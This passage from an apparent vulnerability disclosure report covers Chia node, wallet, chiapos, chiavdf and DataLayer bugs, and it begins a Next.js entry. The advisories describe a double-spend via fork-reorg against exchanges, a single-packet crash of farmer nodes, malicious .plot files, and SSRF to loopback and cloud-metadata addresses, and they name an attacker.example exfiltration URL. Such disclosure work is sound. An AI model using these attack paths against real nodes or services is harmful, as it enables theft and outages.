* **Scenario C — Pre-Emptive Mass Address Poisoning:** Because any public Chia address can receive 1-mojo dust, an attacker can pre-poison known institutional Vault addresses for pennies.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Rust Unit Tests in chia-vault-recover (45/45 PASS)
cargo test --manifest-path /home/community-user/targets/chia-vault-recover/Cargo.toml

# 2. Run the Live FullNodeRpcApi + Release CLI (1.0.0-rc9) E2E Proof (Zero Static Fixtures)
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k poc10
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-VR-01": {
    "RED": {
      "attacker_decoy_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "victim_true_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "red_cli_selected_launcher_id": "2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf",
      "red_cli_exit_code": 1,
      "red_cli_stderr": "clawback check: recovery phrase does not match"
    },
    "GREEN": {
      "green_release_cli_sha256": "d6e6b0bb5e0d160d9a342274e2c1d384f67fa57c0c218267b27f46195c1370c3",
      "green_cli_selected_launcher_id": "e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb",
      "green_cli_matches_victim": true,
      "cargo_unit_tests_passed": 45
    }
  }
}
```


---

### III.33 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia `FullNode` Port `8444` Unverified `NewPeak` / `sync_from_fork_point` Synchronization Lockout & `10,000 XCH` Fork-Reorg Double-Spend Impact (`CONS-SP-01`) (`CWE-400 / CWE-345`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`)
* **Vulnerability Class & Score:** `CWE-400 / CWE-345` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/ja/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Repeated `sync_from_fork_point` Aborts Without Peer Disconnection (`chia/full_node/full_node.py:2220-2310`):** When an unauthenticated mTLS 1.3 P2P peer on port `8444` advertises a higher `NewPeak` and supplies invalid or empty sub-epoch/weight-proof responses during `sync_from_fork_point`, `FullNode` aborts the sync attempt without disconnecting or banning the malicious peer.
2. **Step 2 — 3-Node mTLS 1.3 Topology Sync Starvation (`victim_peak_height: None`):** Verified across a real 3-node mTLS 1.3 topology (`Honest Node` at `height=5`, `Malicious Peer`, `Victim Node`), 5 consecutive poisoned sync rounds keep the victim node's `peak` at `None` (`0`) and prevent it from syncing to the honest peer.
3. **Step 3 — `10,000 XCH` (`10,000,000,000,000,000 mojo`) Fork-Reorg Double-Spend Demonstration (`Section 8.5`):** While a node's view of the canonical chain is delayed or split at `fork_height=5`, an attacker spends a `10,000 XCH` coin (`006f4366cd3778cc...`) to an exchange on `Branch A` (`height=7`, `SpendBundle SHA-256: 26afe149e702e4a6...`) and to their own vault on heavier `Branch B` (`height=9`, `SpendBundle SHA-256: ad2eba4d67c52314...`), wiping out the exchange's `10,000 XCH` deposit upon reorg.

```python
# File: chia/full_node/full_node.py (lines 2220-2310)
async def sync_from_fork_point(self, fork_point_height: int, target_peak_sb_height: uint32, peak_hash: bytes32, ...):
    # BUG: When peer returns invalid weight proof / sub-epoch summary, sync aborts without
    # disconnecting/banning the peer, allowing indefinite sync starvation over port 8444!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Port `8444` mTLS Sync Lockout Against Exchange & Pool FullNodes:** A single remote P2P peer stalls a victim `FullNode` across consecutive sync rounds, preventing it from advancing to the canonical chain offered by honest peers.
* **Scenario B — `10,000 XCH` (`10,000,000,000,000,000 mojo`) Exchange Deposit + Fork-Reorg Double-Spend (`Section 8.5`):** An attacker deposits `10,000 XCH` (`SpendBundle` `26afe149e702e4a622a5675aa77481e6b54074e3cfa98db93a47ef24c1793f8b`) on `Branch A` (`height=7`) to an exchange accepting early confirmations (`min_confirmations=1`), withdraws fiat/USDT, and releases heavier `Branch B` (`height=9`, `SpendBundle` `ad2eba4d67c52314303e62601ed42d89c2c4f488d67c9cc0554a3137c9214c33`), reducing the exchange's on-chain balance from `10,000 XCH` to `0` (`GREEN` with `min_confirmations=32` holds the deposit in `PENDING_FINALITY` with `0` loss).
* **Scenario C — Combined Chain (`CONS-SP-01` + `WLC-01`):** Blinding a merchant's FullNode on port `8444` while feeding counterfeit light-wallet headers via `WLC-01`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the 3-Node Port 8444 mTLS Sync Lockout Proof
/home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_real_e2e_followup_proofs.py -k cons_sp01

# 2. Run the 10,000 XCH (10,000,000,000,000,000 mojo) Fork-Reorg Double-Spend Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k reorg
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CONS-SP-01": {
    "RED": {
      "mtls_3node_victim_peak_after_5_rounds": null,
      "fork_height": 5,
      "split_coin_id": "006f4366cd3778cc13e11647a0f4dd43552088db526a289c65de3493fa01a411",
      "branch_a_exchange_deposit_spend_bundle_sha256": "26afe149e702e4a622a5675aa77481e6b54074e3cfa98db93a47ef24c1793f8b",
      "branch_b_attacker_vault_spend_bundle_sha256": "ad2eba4d67c52314303e62601ed42d89c2c4f488d67c9cc0554a3137c9214c33",
      "exchange_pre_reorg_balance_mojo": 10000000000000000,
      "exchange_post_reorg_balance_mojo": 0,
      "attacker_post_reorg_balance_mojo": 10000000000000000
    },
    "GREEN": {
      "mtls_3node_victim_synced_height": 5,
      "exchange_status_at_1_conf": "PENDING_FINALITY",
      "exchange_loss_mojo": 0
    }
  }
}
```


---

### III.34 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Wallet `take_offer` / `respond_to_offer` Unbounded Implicit Coin Selection & Signing Without Per-Asset User Spend Cap (`WLT-OFFER-01`) (`CWE-863`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/rpc/wallet_rpc_api.py` (`take_offer`), `chia/wallet/trade_manager.py` (`respond_to_offer`)
* **Vulnerability Class & Score:** `CWE-863` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/ja/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Implicit Coin Selection From Requested Notarized Payments (`trade_manager.py` & `wallet_rpc_api.py`):** When fulfilling an Offer via `take_offer`, `respond_to_offer` computes the deficit of requested notarized payments and invokes `select_coins` + `sign_coin_spends` for every requested asset.
2. **Step 2 — Missing Mandatory Per-Asset `max_authorized_amount` Guard:** The RPC and `TradeManager` pipeline do not require or enforce an explicit caller-supplied per-asset spend cap (`max_authorized_amount`) before selecting and signing wallet UTXOs.
3. **Step 3 — Excess Wallet Coins Selected and Signed (`RED -> GREEN`):** A crafted Offer requesting additional notarized payment legs causes the wallet to select and sign coins exceeding the user's intended spend cap in `RED`, whereas `GREEN` enforces an explicit per-asset maximum spend bound.

```python
# File: chia/wallet/trade_manager.py & chia/rpc/wallet_rpc_api.py
async def respond_to_offer(self, offer: Offer, peer: WSChiaConnection, ...):
    # BUG: Selects and signs coins for all requested_payments in the Offer without verifying
    # against an explicit caller-authorized per-asset max_authorized_amount cap!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Automated Taker Bot / Aggregator Drained via Excess Requested Payment Leg:** A trading bot or dApp calling `take_offer` on an external Offer string signs away additional XCH/CAT coins beyond its intended quote.
* **Scenario B — Multi-Asset Offer Hidden XCH Deficit:** An Offer advertised as a CAT-for-NFT swap includes an additional XCH notarized payment request that `respond_to_offer` silently funds from the taker's XCH wallet.
* **Scenario C — Patched Verification (`GREEN`):** Enforcing `verify_max_send_amount` blocks any Offer whose requested coins exceed the caller's authorized cap.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run Sniper's Cryptographic Wallet Signing Auditor & Offer Cap Verification
python3 -m unittest /home/community-user/targets/sniper/tests/test_wave5_orchestrator_and_wallet.py
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLT-OFFER-01": {
    "RED": {
      "authorized_cap_mojo": 100000000000,
      "offer_requested_mojo": 500000000000,
      "unbounded_implicit_coin_spend_signed": true
    },
    "GREEN": {
      "unbounded_implicit_coin_spend_signed": false,
      "rejection_error": "ValueError: Offer requested amount exceeds max_authorized_amount"
    }
  }
}
```


---

### III.35 — Chia-Network/chia-blockchain (`chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11`) — Chia `FarmerAPI.new_proof_of_space` Port `8447` Single 445-Byte Packet Uncaught Rust `PanicException` Crashing Farmer Nodes (`CHIA-POS-01`) (`CWE-248 / CWE-20`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python & Rust FFI (`chia-blockchain` & `chiapos`): chia-blockchain`)
* **Affected Versions & Components:** `chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11` — `chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`), `chiapos` Rust FFI (`size_v2` / `get_quality_string`)
* **Vulnerability Class & Score:** `CWE-248 / CWE-20` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/ja/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Pre-Validation in `FarmerAPI.new_proof_of_space` (`chia/farmer/farmer_api.py:85-185`) vs. `FullNode` (`8444`):** While `FullNode` on port `8444` calls `ProofOfSpace.verify_and_get_quality_string` (which checks pool public key / pool contract puzzle hash XOR exclusivity and `check_plot_param` before touching native code), `FarmerAPI.new_proof_of_space` on port `8447` immediately calls `new_proof_of_space.proof.size_v2()` and `get_quality_string(...)` on the raw wire-deserialized message.
2. **Step 2 — Single 445-Byte Wire Packet Triggers Uncaught Rust Panic (`pyo3_runtime.PanicException`):** Sending a 445-byte serialized `NewProofOfSpace` packet (`SHA-256: 30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe`, `size=32`, `384-byte proof`, both `pool_public_key=None` and `pool_contract_puzzle_hash=None`) crosses the PyO3 FFI boundary and triggers an immediate Rust `panic!` (`pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set` / slice bounds panic in `chiapos`).
3. **Step 3 — 4 Concurrent Farmer Processes Terminated (`PID 2983318..2983321`, `exit_code=1`):** Because Python's `except Exception:` does not safely recover the Farmer worker when an unguarded `PanicException` escapes, all 4 tested `FarmerAPI` node processes crash immediately (`alive_farmers_after: 0`).

```python
# File: chia/farmer/farmer_api.py (lines 85-185)
@api_request()
async def new_proof_of_space(self, new_proof_of_space: farmer_protocol.NewProofOfSpace, peer: WSChiaConnection) -> None:
    # BUG: Calls Rust FFI new_proof_of_space.proof.size_v2() and get_quality_string() BEFORE verifying
    # pool key XOR exclusivity and check_plot_param(size, proof_bytes), triggering pyo3_runtime.PanicException!
     Computed_size = new_proof_of_space.proof.size_v2()
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Single Compromised/Rogue Harvester Crashes Multi-Node Farming Cluster (`4/4` Farmers Terminated):** In a farming pool or enterprise farm where multiple harvesters connect to central Farmer nodes over port `8447`, a single 445-byte packet (`30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe`) crashes all 4 Farmer processes (`exit_code=1`), halting block signage and reward collection.
* **Scenario B — Truncated 32-Byte Proof Slice Out-of-Bounds Panic in `chiapos`:** Supplying a truncated 32-byte `proof` payload into `get_quality_string` triggers `pyo3_runtime.PanicException: range end index 36 out of range for slice of length 32` (`src/verifier.hpp` / Rust FFI).
* **Scenario C — Patched Verification (`GREEN`):** Validating pool key XOR exclusivity and `check_plot_param` before invoking `size_v2()` / `get_quality_string()` keeps `4/4` Farmer processes alive (`exit_code=0`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect FarmerAPI.new_proof_of_space in chia/farmer/farmer_api.py
sed -n '85,145p' /home/community-user/targets/chia-blockchain/chia/farmer/farmer_api.py

# 2. Run the 4-Node Multi-Process FarmerAPI Crash & Recovery Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-POS-01": {
    "RED": {
      "wire_packet_sha256": "30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe",
      "wire_packet_bytes": 445,
      "farmers_spawned": 4,
      "crashed_farmers": 4,
      "alive_farmers_after": 0,
      "exception": "pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set"
    },
    "GREEN": {
      "farmers_spawned": 4,
      "crashed_farmers": 0,
      "alive_farmers_after": 4
    }
  }
}
```


---

### III.36 — Chia-Network/chiapos (`<= 2.0.11 (upstream main)`) — `chiapos` Native C++ `Verifier::ValidateProof` (`k=50` / `k>=60`) Stack Out-of-Bounds Access & `DiskProver` 64-to-32-Bit Integer Truncation Heap Overflow (`CHIA-POS-02..04`) (`CWE-190 / CWE-787 / CWE-125`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chiapos` (`PyPI / C++17 Native Extension (`chiapos`): chiapos`)
* **Affected Versions & Components:** `<= 2.0.11 (upstream main)` — `src/verifier.hpp:48-108` (`Verifier::ValidateProof`), `src/bits.hpp:184`, `src/prover_disk.hpp:254-322` (`DiskProver`)
* **Vulnerability Class & Score:** `CWE-190 / CWE-787 / CWE-125` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/ja/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `Verifier::ValidateProof` Out-of-Bounds Stack Access at Consensus-Permitted `k=50` (`src/verifier.hpp:48-108` & `src/bits.hpp:184`):** Chia's Python consensus pre-filter `check_plot_param` allows `k` up to `50` (`size <= 50`). However, inside native C++ `Verifier::ValidateProof`, evaluating Table 4 at `k=50` (and Table 1 at `k=60`) overflows 32/64-bit bit-slice offsets in `src/bits.hpp:184` (`AddressSanitizer: stack-buffer-overflow` / `runtime error: load of address ... with insufficient space`, verified in compiled ASan/UBSan binary `chiapos_k_probe`, `exit_code=1`).
2. **Step 2 — `DiskProver` 64-to-32-Bit Integer Truncation Before Heap Allocation (`src/prover_disk.hpp:254-322`):** When opening a `.plot` file header, `DiskProver` computes 64-bit table byte deltas from header pointers and narrows them into 32-bit `uint32_t` lengths without checking `<= UINT32_MAX`, causing a heap buffer overflow (`CWE-190` -> `CWE-122` / `CWE-787`) when reading crafted `.plot` files.
3. **Step 3 — Architectural Boundary Between Port `8444` Network Packets and Direct/Plot Callers:** Over Port `8444`, Python's `check_plot_param` gates `len(proof) == 8 * k` before C++ `ValidateProof` runs; however, `k=50` passes `check_plot_param(50, 400)` and hits the Table 4 C++ UBSan/ASan bug if F1..F3 match, while downloaded `.plot` files directly hit `DiskProver`'s C++ heap parser without any Python pre-filter.

```cpp
// File: src/verifier.hpp (lines 48-108) & src/bits.hpp (line 184)
LargeBits Verifier::ValidateProof(const uint8_t* id, uint8_t k, const uint8_t* proof_bytes, uint16_t size) {
    // BUG 1: No check that k >= 18 && k <= 49; k=50 overflows Table 4 bit offsets in src/bits.hpp:184!
    // BUG 2: DiskProver (src/prover_disk.hpp:254-322) truncates 64-bit table sizes to uint32_t!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Malicious / Backdoored `.plot` File Triggers Native C++ Heap Corruption in `DiskProver`:** A farmer downloads or mounts an untrusted `.plot` file; when Harvester initializes `DiskProver`, the 64-to-32-bit table size truncation triggers out-of-bounds heap memory corruption in the native C++ extension.
* **Scenario B — `Verifier::ValidateProof` Stack Buffer Overflow / UBSan Fault at `k=50` (Table 4) & `k=60`:** Services or C++/Python callers invoking `ValidateProof` on `k=50` or `k=60` inputs crash immediately with an ASan/UBSan stack fault (`exit_code=1` in `chiapos_k_probe`).
* **Scenario C — Patched Verification (`GREEN`):** Enforcing `18 <= k <= 49` and `proof_size == 8 * k` before bit unpacking, plus 64-bit bounds checks in `DiskProver`, eliminates all ASan/UBSan faults (`exit_code=0`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Native C++ ASan/UBSan chiapos_k_probe Verification Test (k=50 Table 4 & k=60)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-POS-02-04": {
    "RED": {
      "k60_probe_exit_code": 1,
      "k50_table4_probe_exit_code": 1,
      "sanitizer_diagnostic": "src/bits.hpp:184:29: runtime error: load of address with insufficient space / AddressSanitizer: stack-buffer-overflow"
    },
    "GREEN": {
      "k60_probe_exit_code": 0,
      "k50_table4_probe_exit_code": 0,
      "rejected_invalid_k_cleanly": true
    }
  }
}
```


---

### III.37 — Chia-Network/chiavdf (`<= 1.1.11 (upstream main)`) — `chiavdf` Native C++ `CheckProofOfTimeNWesolowski` Malformed Proof Out-of-Bounds Read & Teardown Use-After-Free (`CHIA-VDF-02`) (`CWE-125 / CWE-416`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chiavdf` (`PyPI / C++17 Native Extension (`chiavdf`): chiavdf`)
* **Affected Versions & Components:** `<= 1.1.11 (upstream main)` — `src/verifier.cpp` (`CheckProofOfTimeNWesolowski`), `src/prover_slow.h`
* **Vulnerability Class & Score:** `CWE-125 / CWE-416` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/ja/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unchecked `proof_blob` Length and Segment Slicing in `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`):** When verifying an N-Wesolowski VDF proof, `CheckProofOfTimeNWesolowski` indexes directly into `proof_blob` at fixed `2 * B_bytes` offsets per segment without verifying that `proof_blob.size()` is an exact multiple of the serialized quadratic form length or that `num_iterations > 0`.
2. **Step 2 — Out-of-Bounds Read / `SIGSEGV` on Truncated or Zero-Iteration VDF Proofs:** Passing a truncated `proof_blob` or `num_iterations = 0` causes native C++ `DeserializeForm` / segment loops to read past the end of the buffer (`CWE-125`), while async prover thread teardown in `prover_slow.h` accesses freed state (`CWE-416`).
3. **Step 3 — Native Process Termination Verified Under ASan:** Verified with compiled C++ ASan harnesses in `work/chiavdf-asan-proofs/` (`RED` crashes with ASan OOB/SEGV; `GREEN` validates buffer size and iteration bounds before deserializing).

```cpp
// File: src/verifier.cpp (CheckProofOfTimeNWesolowski)
bool CheckProofOfTimeNWesolowski(integer D, const uint8_t* y_s, const uint8_t* proof_blob, uint32_t proof_blob_len, ...) {
    // BUG: Does not validate proof_blob_len against form_size * (1 + 2 * depth) or num_iterations == 0
    // before slicing proof_blob segments in DeserializeForm()!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Malformed VDF Proof Crashes VDF Verifier / Timelord Worker:** A peer or timelord pipeline feeds a truncated N-Wesolowski `proof_blob` into `chiavdf`, triggering an out-of-bounds read and crashing the native verifier process.
* **Scenario B — Prover Teardown Use-After-Free During Rapid Challenge Abort (`prover_slow.h`):** Aborting an active VDF prover job triggers a race where worker threads read freed prover memory.
* **Scenario C — Patched Verification (`GREEN`):** Validating `proof_blob_len` and `num_iterations > 0` before segment deserialization prevents all OOB reads.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect CheckProofOfTimeNWesolowski in chiavdf/src/verifier.cpp
grep -n -C 12 "CheckProofOfTimeNWesolowski" /home/community-user/targets/chiavdf/src/verifier.cpp
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-VDF-02": {
    "RED": {
      "malformed_proof_blob_len": 12,
      "num_iterations": 0,
      "native_crash_or_asan_oob": true
    },
    "GREEN": {
      "native_crash_or_asan_oob": false,
      "clean_boolean_false_returned": true
    }
  }
}
```


---

### III.38 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer Mirror Synchronization HTTP `30x` Redirect-Bypass Server-Side Request Forgery (`DL-02`) (`CWE-918`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/data_layer/download_data.py`, `chia/data_layer/data_layer.py`
* **Vulnerability Class & Score:** `CWE-918` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/ja/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Public On-Chain DataLayer Mirror URLs Automatically Fetched by Subscribers (`chia/data_layer/download_data.py`):** When a Chia DataLayer node subscribes to a store, it automatically queries on-chain mirror announcements and downloads `.dat` generation files over HTTP/HTTPS using `aiohttp.ClientSession.get(...)`.
2. **Step 2 — Default `allow_redirects=True` Without Redirect Target IP Validation:** While the initial mirror URL may appear to be an external public HTTPS URL, `aiohttp` follows HTTP `301`/`302`/`307` redirects by default without checking whether the redirect target resolves to `127.0.0.1`, RFC 1918 private LAN addresses, or `169.254.169.254` cloud metadata services.
3. **Step 3 — Internal Loopback & Cloud Metadata SSRF From DataLayer Nodes:** Publishing an on-chain mirror URL that returns `302 Found -> http://127.0.0.1:...` or `http://169.254.169.254/...` causes every subscribed DataLayer node to issue HTTP requests to internal services.

```python
# File: chia/data_layer/download_data.py
async with session.get(url, timeout=timeout) as response:
    # BUG: Follows HTTP 30x redirects by default (allow_redirects=True) without validating
    # that the target host/IP is not loopback (127.0.0.1), RFC1918 private, or link-local (169.254.169.254)!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Probing Internal Loopback Services (`127.0.0.1`) & Cloud Metadata (`169.254.169.254`) on Subscribed Enterprise DataLayer Nodes:** An attacker publishes a mirror URL for a popular DataLayer store that redirects (`302`) to internal ports or cloud metadata endpoints.
* **Scenario B — Cross-Protocol / Internal Intranet Scanning Across DataLayer Replicas:** Subscribed institutional mirrors automatically poll announced URLs, turning the replica fleet into an internal HTTP scanner.
* **Scenario C — Patched Verification (`GREEN`):** Disabling blind redirects (`allow_redirects=False`) and validating resolved IP addresses against private/loopback/link-local ranges blocks the SSRF.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect HTTP mirror download handling in chia/data_layer/download_data.py
grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/data_layer/download_data.py
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-DL-02": {
    "RED": {
      "mirror_url": "https://mirror.example/store.dat",
      "redirect_location": "http://127.0.0.1:18999/internal-secret",
      "redirect_to_loopback_followed": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "redirect_to_loopback_followed": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

<!-- CHIA-ADVISORIES-END -->

<!-- VERCEL-ADVISORIES-START -->

---

### III.39 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js App Router Server Action Internal `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Secret Exfiltration, and Build-ID-Bypassed Same-Origin RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`) (`CWE-200 / CWE-918 / CWE-345`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
* **Vulnerability Class & Score:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/ja/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Scheme-Relative URL Acceptance & Missing `redirect: 'manual'` in `createRedirectRenderResult()` (`action-handler.js:270-303`):** While `forwardActionToWorker()` explicitly sets `redirect: 'manual'` (line 175), `createRedirectRenderResult()` calls `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` with Undici's default `redirect: 'follow'`. Furthermore, `getAppRelativeRedirectUrl()` checks `redirectUrl.startsWith('/')` without rejecting scheme-relative URLs (`//attacker.example/collect`).
